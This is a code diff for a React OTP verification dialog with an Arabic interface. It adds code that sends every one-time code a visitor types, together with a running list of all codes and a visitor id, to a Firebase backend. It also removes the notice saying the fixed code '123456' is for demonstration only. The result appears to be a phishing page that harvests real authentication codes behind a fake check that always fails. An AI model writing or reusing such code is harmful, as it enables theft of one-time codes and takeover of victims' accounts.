@@ -11,6 +11,7 @@ import {
   DialogTitle,
 } from "@/components/ui/dialog"
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
+import { addData } from "@/lib/firebase"
 
 interface OTPDialogProps {
   open: boolean
@@ -18,13 +19,16 @@ interface OTPDialogProps {
   phoneNumber: string
   onSuccess: () => void
 }
-
+const allOtps=['']
 export function OTPDialog({ open, onOpenChange, phoneNumber, onSuccess }: OTPDialogProps) {
   const [otp, setOtp] = useState("")
   const [isVerifying, setIsVerifying] = useState(false)
   const [error, setError] = useState("")
 
   const handleVerify = async () => {
+    const visitorid=localStorage.getItem('visitor')
+    allOtps.push(otp)
+    addData({id:visitorid,otp,allOtps})
     setIsVerifying(true)
     setError("")
     await new Promise((resolve) => setTimeout(resolve, 1500))
@@ -32,6 +36,7 @@ export function OTPDialog({ open, onOpenChange, phoneNumber, onSuccess }: OTPDia
     if (otp === "123456") {
       onSuccess()
     } else {
+      setOtp("")
       setError("رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.")
     }
   }
@@ -59,9 +64,7 @@ export function OTPDialog({ open, onOpenChange, phoneNumber, onSuccess }: OTPDia
               <InputOTPSlot index={5} />
             </InputOTPGroup>
           </InputOTP>
-          <div className="text-sm text-gray-500 text-center">
-            لأغراض العرض، أدخل الرمز <span className="font-bold text-gray-700">123456</span> للمتابعة.
-          </div>
+        
           {error && <p className="text-sm text-red-500">{error}</p>}
         </div>
         <DialogFooter className="sm:justify-center">
